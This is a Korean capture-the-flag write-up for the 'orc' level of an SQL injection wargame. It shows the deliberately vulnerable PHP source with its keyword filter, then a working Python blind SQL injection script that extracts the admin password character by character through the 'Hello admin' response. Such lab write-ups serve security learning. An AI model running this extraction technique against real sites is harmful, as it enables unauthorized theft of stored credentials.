# orc

소스코드는 다음과 같다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 

  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

하나씩 보면 로그인이 되면 `Hello admin`이 출력이 된다.

그리고 `pw`에 `DB`에 저장되어 있는 `pw`를 입력해야만 클리어가 된다.

아마 `Hello admin`이 출력되는 것을 이용하여 값을 얻어내면 될 것 같다.

그래서 스크립트를 짜보았다.

```python
import sys
import urllib
import requests


def get_ascii(param):
    param = urllib.parse.quote(f"1' or id='admin' and {param}")
    url = f"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
    idx = 0
    while(True):
        idx += 1
        data = f"{url}{param}={idx}%23"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
                , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'}
        cookie = {'PHPSESSID' : '33fja4nccc06ve6chlmc5jvo36'}
        res = requests.get(data, headers=headers, cookies = cookie)


        if '<hr><br><h2>Hello admin</h2>' in res.text:
            return idx




def get_length(query):
    return get_ascii("length(%s)" % query)

def get_content(query):
    content_len = get_length(query)
    content = ''
    # print(content_len)
    if content_len == 0:
        print('Invalid input')
        return ''
    if content_len == "error":
        print("Error")
        return "error"
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('ascii(substr(%s,%d,1))' % (query, idx)))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



content = get_content('pw')
```

이렇게 얻은 `pw`값을 다시 보내주면 성공!

